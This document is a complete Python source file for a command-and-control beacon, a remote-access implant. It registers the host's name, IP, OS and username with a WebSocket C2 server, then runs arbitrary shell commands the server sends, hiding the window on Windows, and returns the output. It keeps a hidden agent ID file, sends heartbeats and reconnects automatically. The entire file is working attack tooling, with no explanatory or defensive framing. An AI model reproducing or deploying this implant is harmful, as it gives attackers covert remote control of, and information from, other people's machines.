import socket
import platform
import subprocess
import threading
import time
import json
import os
import uuid

try:
    import websocket
except ImportError:
    os.system('pip install websocket-client')
    import websocket

C2_SERVER = "ws://127.0.0.1:8080"
RECONNECT_DELAY = 5
HEARTBEAT_INTERVAL = 30

class Beacon:
    def __init__(self):
        self.agent_id = self.get_agent_id()
        self.ws = None
        self.running = True
        self.connected = False

    def get_agent_id(self):
        id_file = os.path.join(os.environ.get('TEMP', '/tmp'), '.beacon_id')
        if os.path.exists(id_file):
            with open(id_file, 'r') as f:
                return f.read().strip()
        agent_id = str(uuid.uuid4())[:8]
        try:
            with open(id_file, 'w') as f:
                f.write(agent_id)
        except:
            pass
        return agent_id

    def get_system_info(self):
        hostname = socket.gethostname()
        try:
            ip = socket.gethostbyname(hostname)
        except:
            ip = "127.0.0.1"
        return {
            "hostname": hostname,
            "ip": ip,
            "os": f"{platform.system()} {platform.release()}",
            "username": os.environ.get('USERNAME', os.environ.get('USER', 'unknown'))
        }

    def execute_command(self, command):
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=120,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=120
                )
            output = result.stdout + result.stderr
            return output.strip() if output.strip() else "[No output]"
        except subprocess.TimeoutExpired:
            return "[Command timed out]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def send(self, data):
        if self.ws and self.connected:
            try:
                self.ws.send(json.dumps(data))
            except:
                pass

    def on_message(self, ws, message):
        try:
            data = json.loads(message)
            if data.get('type') == 'execute_command':
                command = data.get('command', '')
                command_id = data.get('command_id', '')
                db_command_id = data.get('db_command_id', 0)
                
                result = self.execute_command(command)
                
                self.send({
                    'type': 'command_result',
                    'command_id': command_id,
                    'db_command_id': db_command_id,
                    'result': result
                })
        except:
            pass

    def on_open(self, ws):
        print("[+] Connected to C2 server")
        self.connected = True
        info = self.get_system_info()
        self.send({
            'type': 'agent_register',
            'agent_id': self.agent_id,
            **info
        })
        
        def heartbeat():
            while self.running and self.connected:
                time.sleep(HEARTBEAT_INTERVAL)
                self.send({
                    'type': 'agent_heartbeat',
                    'agent_id': self.agent_id
                })
        
        t = threading.Thread(target=heartbeat, daemon=True)
        t.start()

    def on_close(self, ws, close_status_code, close_msg):
        print("[-] Disconnected from server")
        self.connected = False

    def on_error(self, ws, error):
        print(f"[!] WebSocket error: {error}")
        self.connected = False

    def connect(self):
        print(f"[*] Connecting to {C2_SERVER}...")
        while self.running:
            try:
                self.ws = websocket.WebSocketApp(
                    C2_SERVER,
                    on_message=self.on_message,
                    on_open=self.on_open,
                    on_close=self.on_close,
                    on_error=self.on_error
                )
                self.ws.run_forever()
            except Exception as e:
                print(f"[!] Connection error: {e}")
            
            if self.running:
                print(f"[*] Reconnecting in {RECONNECT_DELAY}s...")
                time.sleep(RECONNECT_DELAY)

    def run(self):
        self.connect()

if __name__ == "__main__":
    beacon = Beacon()
    beacon.run()
